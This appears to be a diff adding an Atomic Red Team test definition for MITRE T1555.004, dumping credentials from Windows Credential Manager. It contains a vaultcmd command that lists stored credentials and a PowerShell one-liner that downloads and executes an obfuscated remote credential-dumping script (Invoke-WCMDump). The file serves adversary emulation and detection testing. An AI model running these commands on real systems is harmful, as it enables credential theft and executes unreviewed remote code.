@@ -1,0 +1,38 @@
+attack_technique: T1555.004
+display_name: 'Credentials from Password Stores: Windows Credential Manager'
+atomic_tests:
+    - name: Access Saved Credentials via VaultCmd
+      item_id: T1555.004-1
+      auto_generated_guid: 9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439
+      description: |
+        List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe
+        Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos
+        https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/
+        https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
+      supported_platforms:
+        - windows
+      input_arguments: {}
+      dependency_executor_name: ""
+      dependencies: []
+      executor:
+        command: |
+            vaultcmd /listcreds:"Windows Credentials"
+        cleanup_command: ""
+        name: command_prompt
+        elevation_required: false
+    - name: WinPwn - Loot local Credentials - Invoke-WCMDump
+      item_id: T1555.004-2
+      auto_generated_guid: fa714db1-63dd-479e-a58e-7b2b52ca5997
+      description: Loot local Credentials - Invoke-WCMDump technique via function of WinPwn
+      supported_platforms:
+        - windows
+      input_arguments: {}
+      dependency_executor_name: ""
+      dependencies: []
+      executor:
+        command: |-
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+            Invoke-WCMDump
+        cleanup_command: ""
+        name: powershell
+        elevation_required: false
